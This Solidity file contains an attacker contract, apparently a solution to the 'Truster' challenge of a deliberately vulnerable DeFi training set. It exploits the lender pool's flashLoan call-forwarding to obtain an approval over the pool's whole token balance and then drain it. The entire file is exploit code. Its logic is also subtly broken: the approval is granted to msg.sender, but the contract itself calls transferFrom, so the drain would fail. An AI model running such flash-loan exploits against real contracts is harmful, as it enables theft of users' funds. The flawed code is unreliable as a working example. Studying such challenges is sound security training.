// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "@openzeppelin/contracts/utils/ReentrancyGuard.sol";
import "./TrusterLenderPool.sol";

contract FlashLoanAttacker is ReentrancyGuard {
    IERC20 public damnValuableToken;
    TrusterLenderPool public lenderPool;

    constructor(address tokenAddress, address poolAddress) public {
        damnValuableToken = IERC20(tokenAddress);
        lenderPool = TrusterLenderPool(poolAddress);
    }

    function attack() external nonReentrant {
        // Call approve from the targer contract to the attacker address
        bytes memory data = abi.encodeWithSignature("approve(address,uint256)", msg.sender, damnValuableToken.balanceOf(address(lenderPool)));

        // Flash loan the tokens to this contract
        lenderPool.flashLoan(0, address(this), address(damnValuableToken), data);

        // Transfer the target balance to the attacker address
        damnValuableToken.transferFrom(address(lenderPool), msg.sender, damnValuableToken.balanceOf(address(lenderPool)));
    }
}
